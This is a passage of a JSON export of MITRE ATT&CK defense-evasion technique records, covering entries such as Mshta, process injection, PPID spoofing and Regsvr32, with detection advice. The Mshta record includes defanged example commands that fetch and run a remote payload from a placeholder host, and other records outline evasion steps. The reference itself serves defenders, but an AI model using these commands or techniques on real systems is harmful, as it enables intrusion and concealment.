href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a> may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.<\/p>\n<p>Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and\/or be ignored when read via <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a> or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads\/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)<\/p>\n<p>The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> are required, along with access to the remote system's <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\/002\">SMB\/Windows Admin Shares<\/a> for RPC communication.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and\/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":293,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":294,"name":"T1170 - Mshta","sort_id":0,"external_id":"T1170","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta<\/code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)<\/p>\n<p>Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) <\/p>\n<p>Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:https[:]\/\/webserver\/payload[.]sct&quot;&quot;)&quot;))<\/code><\/p>\n<p>They may also be executed directly from URLs: <code>mshta http[:]\/\/webserver\/payload[.]hta<\/code><\/p>\n<p>Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":294,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":299,"name":"T1096 - NTFS File Attributes","sort_id":0,"external_id":"T1096","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file\/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)<\/p>\n<p>Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":299,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":303,"name":"T1126 - Network Share Connection Removal","sort_id":0,"external_id":"T1126","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Windows shared drive and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1077\">Windows Admin Shares<\/a> connections can be removed when no longer needed. <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> is an example utility that can be used to remove network share connections with the <code>net use \\system\\share \/delete<\/code> command. (Citation: Technet Net Use)<\/p>\n<p>Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":303,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":307,"name":"T1027 - Obfuscated Files or Information","sort_id":0,"external_id":"T1027","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. <\/p>\n<p>Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1140\">Deobfuscate\/Decode Files or Information<\/a> for <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a>. The user may also be required to input a password to open a password protected compressed\/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. <\/p>\n<p>Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux\/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)<\/p>\n<p>Adversaries may also obfuscate commands executed from payloads or directly via a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\">Command and Scripting Interpreter<\/a>. Environment variables, aliases, characters, and other platform\/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files\/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":307,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":307,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":307,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":309,"name":"T1502 - Parent PID Spoofing","sort_id":0,"external_id":"T1502","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess<\/code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe<\/code> or <code>consent.exe<\/code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)<\/p>\n<p>Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual\/potentially malicious parent-child process relationships, such as spoofing the PPID of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1086\">PowerShell<\/a>\/<a href=\"https:\/\/attack.mitre.org\/techniques\/T1085\">Rundll32<\/a> to be <code>explorer.exe<\/code> rather than an Office document delivered as part of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1193\">Spearphishing Attachment<\/a>.(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA <a href=\"https:\/\/attack.mitre.org\/techniques\/T1064\">Scripting<\/a> within a malicious Office document or any code that can perform <a href=\"https:\/\/attack.mitre.org\/techniques\/T1106\">Execution through API<\/a>.(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)<\/p>\n<p>Explicitly assigning the PPID may also enable <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0004\">Privilege Escalation<\/a> (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe<\/code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":309,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":317,"name":"T1150 - Plist Modification","sort_id":0,"external_id":"T1150","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by &lt; &gt;. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>\/Library\/Preferences<\/code> (which execute with elevated privileges) and <code>~\/Library\/Preferences<\/code> (which execute with a user's privileges).\nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":317,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":318,"name":"T1205 - Traffic Signaling","sort_id":0,"external_id":"T1205","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1205\/001\">Port Knocking<\/a>), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.<\/p>\n<p>Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).<\/p>\n<p>The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":318,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":318,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":318,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":324,"name":"T1186 - Process Doppelg\u00e4nging","sort_id":0,"external_id":"T1186","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)<\/p>\n<p>Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)<\/p>\n<p>Adversaries may leverage TxF to a perform a file-less variation of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a> called Process Doppelg\u00e4nging. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1093\">Process Hollowing<\/a>, Process Doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)<\/p>\n<p>Process Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):<\/p>\n<ul>\n<li>Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.<\/li>\n<li>Load \u2013 Create a shared section of memory and load the malicious executable.<\/li>\n<li>Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.<\/li>\n<li>Animate \u2013 Create a process from the tainted section of memory and initiate execution.<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":324,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":325,"name":"T1093 - Process Hollowing","sort_id":0,"external_id":"T1093","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>, execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Endgame Process Injection July 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":325,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":326,"name":"T1055 - Process Injection","sort_id":0,"external_id":"T1055","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. <\/p>\n<p>There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. <\/p>\n<p>More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread<\/code>, <code>SuspendThread<\/code>\/<code>SetThreadContext<\/code>\/<code>ResumeThread<\/code>, <code>QueueUserAPC<\/code>\/<code>NtQueueApcThread<\/code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx<\/code>\/<code>WriteProcessMemory<\/code>, may be used for this technique.(Citation: Endgame Process Injection July 2017) \n\nMonitor DLL\/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":326,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":326,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":326,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":330,"name":"T1108 - Redundant Access","sort_id":0,"external_id":"T1108","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. <\/p>\n<p>If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1133\">External Remote Services<\/a> such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.<\/p>\n<p>Use of a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1100\">Web Shell<\/a> is one such way to maintain access to a network through an externally accessible Web server.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":5,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":330,"platform_id":9,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":332,"name":"T1121 - Regsvcs\/Regasm","sort_id":0,"external_id":"T1121","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)<\/p>\n<p>Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]<\/code> or <code>[ComUnregisterFunction]<\/code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":332,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":333,"name":"T1117 - Regsvr32","sort_id":0,"external_id":"T1117","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)<\/p>\n<p>Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.<\/p>\n<p>Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a &quot;Squiblydoo&quot; attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)<\/p>\n<p>Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1122\">Component Object Model Hijacking<\/a>. (Citation: Carbon Black Squiblydoo Apr 2016)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":333,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":341,"name":"T1536 - Revert Cloud Instance","sort_id":0,"external_id":"T1536","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be easily facilitated using restoration from VM or data storage snapshots through the cloud management dashboard. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and\/or ephemeral, with the latter types often reset upon stop\/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":341,"platform_id":6,"created_at":"2020-06-26 